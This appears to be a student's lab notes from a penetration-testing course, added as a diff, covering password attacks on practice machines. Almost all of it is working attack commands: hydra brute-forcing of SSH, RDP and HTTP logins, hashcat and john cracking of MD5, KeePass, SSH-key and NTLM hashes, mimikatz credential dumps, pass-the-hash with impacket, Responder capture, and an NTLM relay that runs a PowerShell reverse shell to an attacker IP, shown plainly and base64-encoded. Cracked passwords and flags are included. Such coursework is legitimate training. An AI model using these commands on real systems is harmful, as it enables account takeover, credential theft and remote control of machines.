@@ -1,0 +1,253 @@
+Password attacks
+
+192.168.58.201
+
+cd /usr/share/wordlists/
+ls
+sudo gzip -d rockyou.txt.gz
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+
+george
+chocolate
+
+ssh -p 2222 george@192.168.58.201
+
+OS{4890a9f28151af76ea5a9d21f38211ea}
+
+-----------------------------
+192.168.58.202
+
+echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/lab_names.txt
+hydra -L /usr/share/wordlists/dirb/others/lab_names.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.58.202
+
+xfreerdp /v:192.168.58.202 /u:daniel /p:MySecureP@ssw0rd
+
+----------------
+192.168.58.201
+
+HTTP basic authentication
+Raw HTTP request to find the Authorization header. It will look like Authorization: Basic <base64_encoded_credentials>
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.58.201 http-get "/index.php:Username=admin&Password=^PASS^"
+
+wrong!
+
+------------
+26x2 = 52
+password length= 8
+hashcat MD5 GPU
+
+python3 -c "print(52**8)"= 53459728531456
+python3 -c "print(53459728531456 / 68185100000 / 60)"= 13.067304668091221
+13 (min)
+
+-------------
+Mutating wordlists
+
+056df33e47082c77148dba529212d50a MD5
+rule: add 1@3$5
+echo '$1$@$3$$$5' > rule1.rule
+echo '056df33e47082c77148dba529212d50a' > crackme1.txt
+
+/usr/share/wordlists/rockyou.txt.gz
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+hashcat --stdout -r rule1.rule /usr/share/wordlists/rockyou.txt | head
+
+hashcat -m 0 ./crackme1.txt /usr/share/wordlists/rockyou.txt -r ./rule1.rule --force --show
+056df33e47082c77148dba529212d50a:courtney1@3$5
+courtney1@3$5
+
+----------
+https://hashes.com/en/tools/hash_identifier
+
+4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7
+SHA3-384
+
+$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC
+Blowfish
+
+---------------
+Password manager
+
+target: 192.168.64.203 (jason/lab)
+
+xfreerdp /u:jason /p:lab /v:192.168.64.203
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+c:\users\jason\documents\Database.kdbx
+
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+
+hashcat --help | grep -i "KeePass"
+
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+Master:
+qwertyuiop123!
+
+User Company Password
+XOWV2yg3JVkYc5cOBYip
+
+---------------
+SSH private key passphrase
+
+http://192.168.64.201:8080
+user:121212
+id_rsa, note.txt
+
+chmod 600 id_rsa
+ssh -i id_rsa -p 2222 dave@192.168.64.201
+
+ssh2john id_rsa > ssh.hash
+cat ssh.hash
+$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682d727361000000030100010000018100efae6dfe87157683772695bba9daf5f40bff961ed5d329a2706a68fa2b704b0718c1464e60d07cc7d39b546f9a89642a36b0536276cfbb06f3b9349f3d7fdfb54................
+(VI, press 0 (the number zero) to move the cursor to the absolute first character position in the line, G$ first moves to the last line of the file (G), then moves to the end of that line ($). )
+
+hashcat -h | grep -i "ssh"
+hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+
+cat ssh.rule
+[List.Rules:sshRules]
+c $1 $3 $7 $1
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'
+
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+Umbrella137! 
+
+/home/dave/flag.txt
+OS{c28edf8ddb06df0ef8f23ed47c994b3f}
+
+-------
+Cracking NTLM
+
+192.168.64.210
+offsec/lab
+
+xfreerdp /u:offsec /p:lab /v:192.168.64.210
+
+Get-LocalUser
+
+c:\tools\mimikatz.exe
+
+privilege::debug
+token::elevate
+lsadump::sam
+
+nelly.hash
+3ae8e5f0ffabb3a627672e1600f1ba10
+
+hashcat --help | grep -i "ntlm"
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+nicole1  
+
+xfreerdp /u:nelly /p:nicole1 /v:192.168.64.210
+c:\users\nelly\desktop\flag.txt
+OS{823b6cee52267d27708827d25feb54f7}
+
+--------
+Passing NTLM
+
+192.168.64.211
+
+VM#1 192.168.64.211
+gunther:password123!
+
+VM#2 192.168.64.212
+
+xfreerdp /u:gunther /p:password123! /v:192.168.64.211
+c:\tools\mimikatz
+privilege::debug
+token::elevate
+lsadump::sam
+
+User: Administrator
+Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.64.212
+hostname
+ipconfig
+whoami
+
+OR
+
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.64.212
+whoami
+
+c:\users\Administrator\Desktop\flag.txt
+OS{08c797d9f566882144a18755a5b54801}
+
+-----------
+Cracking Net-NTLMv2
+
+NTLM is the older, weaker protocol, while Net-NTLMv2 is its significantly improved, more secure successor, primarily differing in stronger cryptography (HMAC-MD5 vs. weak DES), variable-length challenges with timestamps, and better defense against relay attacks, though both are being deprecated in favor of Kerberos for modern Windows security. Net-NTLMv2 adds client-side timestamps and uses HMAC-MD5 for better hashing, making it harder to crack than NTLMv1's DES-based method, but its fundamental challenge-response mechanism still leaves room for attacks like Pass-The-Hash compared to Kerberos. 
+
+attacker: 192.168.49.64
+target: 192.168.64.211
+
+nc 192.168.64.211 4444
+whoami
+net user paul
+
+ip a
+sudo responder -I eth0
+
+dir \\192.168.49.64\test
+
+paul::FILES01:9928fd232e4e73a4:2BE6BFE5F7F40B15EC82D7BDD3684C9E:010100000000000080AF85E9A483DC017704CF310C3F7683000000000200080047004D004A005A0001001E00570049004E002D004F0054004500550038004B005400500059005A00460004003400570049004E002D004F0054004500550038004B005400500059005A0046002E0047004D004A005A002E004C004F00430041004C000300140047004D004A005A002E004C004F00430041004C000500140047004D004A005A002E004C004F00430041004C000700080080AF85E9A483DC01060004000200000008003000300000000000000000000000002000001DA4CD507B867C802AFAC2E1CFB82606102698E92855867AD4E70566F52DDFFE0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00360034000000000000000000
+
+echo "paul::...." > paul.hash
+cat paul.hash
+hashcat -hh | grep -i "ntlm"
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+
+123Password123
+
+xfreerdp /u:paul /p:123Password123 /v:192.168.64.211
+flag.txt
+OS{d74fab23957432323e4a4dae9eea59fd}
+
+----------
+Relaying Net-NTLMv2
+
+attacker: 192.168.49.64
+target:
+192.168.64.211
+192.168.64.212
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.64.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+
+powershell_reverse_shell.ps1:
+$client = New-Object System.Net.Sockets.TCPClient('192.168.49.64',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+Ref: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+
+Base64:
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40OS42NCcsODA4MCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggIi4geyAkZGF0YSB9IDI+JjEiIHwgT3V0LVN0cmluZyApOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ==
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.64.212 -c "powershell -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40OS42NCcsODA4MCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggIi4geyAkZGF0YSB9IDI+JjEiIHwgT3V0LVN0cmluZyApOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ=="
+
+nc -nvlp 8080
+
+nc 192.168.64.211 5555
+whoami
+files01\files02admin
+dir \\192.168.49.64\test
+
+NC listener cant caught reverse shell !
+
+
+
+
+
+
+
+
+
+
+
+
